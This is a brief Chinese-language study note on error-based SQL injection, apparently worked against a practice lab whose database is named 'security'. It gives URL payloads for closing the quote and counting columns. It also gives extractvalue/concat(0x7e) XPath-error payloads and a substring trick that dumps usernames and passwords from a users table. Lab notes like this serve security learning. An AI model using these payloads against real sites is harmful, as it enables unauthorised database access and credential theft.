## 报错注入
1. ?id=1' order by 100 --+ 报错 Unknown column '100' in 'order clause' 说明已经正确闭合了

2. ?id=-1'  order by 3--+ 什么都不显示

3. ?id=1'  order by 3--+ 只显示 You are in.........

4. 故意调用不存在的函数套出数据库名：?id=1' union select fuck() --+ 报错 FUNCTION security.fuck does not exist 说明数据库名为 security

5. 利用 extractvalue 报错注入：

6. ```sql
   select extractvalue(1, concat(0x7e, (select database())))
   ```

7. 注意 select database() 必须用括号括起来，才会被当成代码执行。 0x7e 是飘带符号~的代码。

8. 注意这里用 union 连接前面的句子时其实不用考虑列数有没有对齐，报错照样回显

9. 后面的步骤与前面相同

10. 遇到问题：最多默认返回32个字符，利用 substring/substr 函数解决

11. ```sql
    union select 1,2,extractvalue('nanamo', substring(concat(0x7e, (select group_concat(username,'~',password) from users)),4,30))
    ```

substr(string, a, b)

利用 extractvalue() 注入：

```sql
select extractvalue('XML_document','Xpath_string') from xml
```

正常查询语句

Xpath_string例子：/book/author/surname

1. 若查询不存在的路径，找不到内容但不报错
2. 将 / 改为 ~ 产生错误 xpath syntax error 后面跟着路径回显，于是通过这处回显进行注入

substring()

```sql
substring(123456,1,3)
```

返回：123

```sql
substring(123456,4,3)
```

返回：456

即下标从1开始，第一个参数表示字符串，然后取从第二个参数给定的下标开始，数第三个参数给定的个数，得到的子串

